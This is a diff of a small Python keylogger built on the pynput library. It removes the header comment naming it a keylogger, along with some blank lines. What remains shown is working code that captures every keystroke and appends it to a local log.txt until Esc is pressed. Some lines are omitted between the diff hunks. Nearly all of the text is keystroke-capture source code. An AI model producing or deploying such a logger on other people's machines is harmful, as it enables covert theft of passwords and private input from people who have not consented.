@@ -1,12 +1,9 @@
-# Keylogger by Mahesh Sawant.
-
 import pynput
 
 from pynput.keyboard import Key,Listener
 
 count = 0
 keys = []
-
 
 def on_press(key):
     global keys, count
@@ -19,7 +16,6 @@ def on_press(key):
         count = 0
         write_file(keys)
         keys = []
-
 
 def write_file(keys):
     with open("log.txt","a") as f:
@@ -38,7 +34,6 @@ def write_file(keys):
             elif k.find("Key"):
                 f.write(k)
 
-
 def on_release(key):
     global exit
     if key == Key.esc:
@@ -49,4 +44,3 @@ def on_release(key):
 exit = 0
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
-
